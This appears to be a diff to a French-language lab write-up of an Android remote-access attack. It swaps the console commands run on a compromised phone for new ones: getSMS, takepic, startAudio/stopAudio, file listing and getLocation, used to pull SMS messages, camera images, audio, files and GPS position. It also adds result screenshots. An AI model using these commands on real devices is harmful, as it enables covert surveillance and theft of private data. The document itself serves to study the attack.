@@ -31,22 +31,32 @@ Une fois connecté, les commandes suivantes ont été exécutées :
 
 #### 📩 Accès aux Messages SMS
 ```
-GET sms 
+getSMS sent
+getSMS inbox
 ```
 - Extraction et affichage de tous les SMS stockés sur l’appareil.
 
+![sms](sms_resultat.png)
+
 #### 📷 Accès à la Caméra
-```bash
-camera snap
+```
+camList
+
+takepic 0
+takepic 1
 ```
 - Capture d'images via la caméra avant/arrière.
 
+![sms](image_result.png)
+
 #### 🎙️ Enregistrement Audio
-```bash
-record start
-record stop
+```
+startAudio
+stopAudio
 ```
 - Activation du microphone et enregistrement audio.
+
+![sms](audio_result.png)
 
 #### 📂 Accès aux Fichiers Stockés
 ```bash
@@ -55,11 +65,12 @@ file list /sdcard
 - Exploration des fichiers enregistrés sur l’appareil.
 
 #### 📍 Géolocalisation de l’Appareil
-```bash
-location
+```
+getLocation
 ```
 - Récupération des coordonnées GPS en temps réel.
 
+![sms](location.png)
 ---
 
 ## 📝 Résultats de l'Attaque
